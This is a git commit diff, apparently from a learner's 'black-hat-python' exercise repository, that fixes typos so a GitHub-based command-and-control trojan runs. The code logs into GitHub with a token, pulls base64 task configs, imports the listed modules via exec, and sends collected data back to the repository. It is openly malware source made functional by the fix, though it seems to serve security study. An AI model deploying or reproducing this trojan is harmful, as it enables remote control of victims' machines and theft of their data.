679b3cf0c84829a5dd6a26cc031de8a3d8366bc1
Achilles <achillespentest@gmail.com>
2025-04-27 20:28:24 +0530

    trojan-fixed

--- black-hat-python/github-command-and-control/git-trojan.py
+++ black-hat-python/github-command-and-control/git-trojan.py
@@ -4,33 +4,34 @@ import importlib
 import json
 import random
 import sys
-import treading
+import threading
 import time
 
-from datatime import datetime
+from datetime import datetime
 
 def github_connect():
     with open('mytoken.txt') as f:
-        token = f.read()
-    user = 'tiarno'
+        token = f.read().strip()
+    user = 'achilles945'
     sess = github3.login(token=token)
     return sess.repository(user, 'bhptrojan')
 
+
 def get_file_contents(dirname, module_name, repo):
-    return reop.file_contents(f'{dirname}/{module_name}').connect
+    return repo.file_contents(f'{dirname}/{module_name}').content
 
 class Trojan:
     def __init__(self, id):
         self.id = id
         self.config_file = f'{id}.json'
         self.data_path = f'data/{id}/'
-        self.reop = github_connect()
+        self.repo = github_connect()
 
     def get_config(self):
         config_json = get_file_contents('config', self.config_file, self.repo)
         config = json.loads(base64.b64decode(config_json))
         for task in config:
-            if task['module'] not is sys.modules:
+            if task['module'] not in sys.modules:
                 exec("import %s" % task['module'])
         return config
 
@@ -45,8 +46,8 @@ class Trojan:
         self.repo.create_file(remote_path, message, base64.b64encode(bindata))
 
     def run(self):
-        white True:
-            config = self.get_config()
+        while True:
+            config = self.get_config() 
             for task in config:
                 thread = threading.Thread(
                         target=self.module_runner,
